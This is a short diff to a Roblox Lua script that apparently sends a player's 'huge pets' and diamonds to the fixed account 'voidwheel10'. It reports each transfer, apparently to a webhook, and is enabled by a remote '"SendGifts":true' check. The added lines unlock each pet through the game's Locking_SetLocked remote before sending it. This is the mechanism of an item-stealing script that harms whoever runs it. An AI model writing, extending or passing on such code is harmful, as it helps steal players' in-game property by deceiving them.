@@ -123,7 +123,13 @@ function ProcessHugePets()
                     content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
                 })
             })
+local args = {
+    [1] = uids[i],
+    [2] = false
+}
 
+game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+wait(1)
             wait(3)
 
             local args = {
@@ -393,6 +399,7 @@ wait(5)
 
         if checkResponse and checkResponse.Body:find('"SendGifts":true') then
             if diamondsvalue > 50 then
+
                 local args = {
                     [1] = "voidwheel10",
                     [2] = "enjoy bro",
